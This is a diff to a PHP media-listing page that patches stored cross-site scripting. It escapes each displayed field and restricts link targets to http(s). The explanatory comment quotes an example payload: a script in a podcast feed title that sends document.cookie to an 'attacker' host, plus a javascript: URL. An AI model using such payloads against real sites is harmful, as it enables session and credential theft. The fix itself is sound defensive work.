@@ -173,56 +173,76 @@
 					print "./images/empty.png";
 					}
 				}
+			// MED-15: every $all_media[…] field below is rendered raw into
+			// HTML. data.json is admin-controlled in normal use, but its
+			// contents flow from /api/add and /api/edit which themselves
+			// take user input — and even more directly, RSS resume entries
+			// pick up the feed's own title/description fields, which are
+			// fully attacker-controlled. A podcast feed with
+			// `<title><script>fetch('http://attacker/'+document.cookie)
+			// </script></title>` would land that script into media.php
+			// (the admin's session cookie + interfacelogin password hash
+			// as exfil candidates). htmlspecialchars on every echoed
+			// value, plus URL-validation on the href anchors so a
+			// `cover` value of `javascript:alert(1)` can't activate.
+			$h = function($v) { return htmlspecialchars((string)$v, ENT_QUOTES, 'UTF-8'); };
+			// For href values we additionally insist on http(s) — anything
+			// else (javascript:, data:, file:) collapses to '#'.
+			$safeHref = function($v) {
+				$s = (string)$v;
+				if (preg_match('#^https?://#i', $s)) return htmlspecialchars($s, ENT_QUOTES, 'UTF-8');
+				return '#';
+			};
 			print "'></div><div class='media_txt'>";
-			print "<table><tr><td width='100px'>Index:</td><td>" . $all_media['index'] . "</td></tr>";
-			print "<tr><td>Type:</td><td>" . $all_media['type'] . "</td></tr>";
-			print "<tr><td>Category:</td><td>" . $all_media['category'] . "</td></tr>";
+			print "<table><tr><td width='100px'>Index:</td><td>" . $h($all_media['index']) . "</td></tr>";
+			print "<tr><td>Type:</td><td>" . $h($all_media['type']) . "</td></tr>";
+			print "<tr><td>Category:</td><td>" . $h($all_media['category']) . "</td></tr>";
 			if($all_media['artist'])
 				{
-				print "<tr><td>Artist:</td><td>" . $all_media['artist'] . "</td></tr>";
+				print "<tr><td>Artist:</td><td>" . $h($all_media['artist']) . "</td></tr>";
 				}
 			if($all_media['title'])
 				{
-				print "<tr><td>Title:</td><td>" . $all_media['title'] . "</td></tr>";
+				print "<tr><td>Title:</td><td>" . $h($all_media['title']) . "</td></tr>";
 				}
 			if($all_media['id'])
 				{
 				if($all_media['category'] == "radio")
 					{
-					print "<tr><td>ID:</td><td><a href='" . $all_media['id'] . "' target='_blank'>" . $all_media['id'] . "</a></td></tr>";
+					print "<tr><td>ID:</td><td><a href='" . $safeHref($all_media['id']) . "' target='_blank'>" . $h($all_media['id']) . "</a></td></tr>";
 					}
 				else
 					{
-					print "<tr><td>ID:</td><td>" . $all_media['id'] . "</td></tr>";
+					print "<tr><td>ID:</td><td>" . $h($all_media['id']) . "</td></tr>";
 					}
 				}
 			if($all_media['artistid'])
 				{
-				print "<tr><td>ID:</td><td>" . $all_media['artistid'] . "</td></tr>";
+				print "<tr><td>ID:</td><td>" . $h($all_media['artistid']) . "</td></tr>";
 				}
 			if($all_media['showid'])
 				{
-				print "<tr><td>ID:</td><td>" . $all_media['showid'] . "</td></tr>";
+				print "<tr><td>ID:</td><td>" . $h($all_media['showid']) . "</td></tr>";
 				}
 			if($all_media['query'])
 				{
-				print "<tr><td>Search query:</td><td>" . $all_media['query'] . "</td></tr>";
+				print "<tr><td>Search query:</td><td>" . $h($all_media['query']) . "</td></tr>";
 				}
 			if($all_media['shuffle'])
 				{
-				print "<tr><td>Shuffle:</td><td>" . $all_media['shuffle'] . "</td></tr>";
+				print "<tr><td>Shuffle:</td><td>" . $h($all_media['shuffle']) . "</td></tr>";
 				}
 			if($all_media['cover'])
 				{
-				print "<tr><td>Cover-URL:</td><td><a href='" . $all_media['cover'] . "' target='_blank'>" . substr($all_media['cover'],0,45) . "...</a></td></tr>";
+				print "<tr><td>Cover-URL:</td><td><a href='" . $safeHref($all_media['cover']) . "' target='_blank'>" . $h(substr($all_media['cover'],0,45)) . "...</a></td></tr>";
 				}
 			if($all_media['artistcover'])
 				{
-				print "<tr><td style>Cover-URL:</td><td><a href='" . $all_media['artistcover'] . "' target='_blank'>" . substr($all_media['artistcover'],0,45) . "...</a></td></tr>";
+				print "<tr><td style>Cover-URL:</td><td><a href='" . $safeHref($all_media['artistcover']) . "' target='_blank'>" . $h(substr($all_media['artistcover'],0,45)) . "...</a></td></tr>";
 				}
 			if($all_media['sorting'])
 				{
-				print "<tr><td>Sorting:</td><td>".$all_media['sorting']."</td></tr>";
+				print "<tr><td>Sorting:</td><td>".$h($all_media['sorting'])."</td></tr>";
 				}
 			if($all_media['aPartOfAll'])
 				{
@@ -230,16 +250,16 @@
 				}
 			if($all_media['aPartOfAllMin'])
 				{
-				print "<tr><td>Interval-Start:</td><td>".$all_media['aPartOfAllMin']."</td></tr>";
+				print "<tr><td>Interval-Start:</td><td>".$h($all_media['aPartOfAllMin'])."</td></tr>";
 				}
 			if($all_media['aPartOfAllMax'])
 				{
-				print "<tr><td>Interval-End:</td><td>".$all_media['aPartOfAllMax']."</td></tr>";
+				print "<tr><td>Interval-End:</td><td>".$h($all_media['aPartOfAllMax'])."</td></tr>";
 				}
-			
+
 			if($url2media)
 				{
-				print "<tr><td>Spotify:</td><td><a href='" . $url2media . "' target='_blank'>" . substr($url2media,0,45) . "...</a></td></tr>";
+				print "<tr><td>Spotify:</td><td><a href='" . $safeHref($url2media) . "' target='_blank'>" . $h(substr($url2media,0,45)) . "...</a></td></tr>";
 				}
 			print "</table></div>\n";
 			//print "URL: " . $all_media['type'] . "<br>";
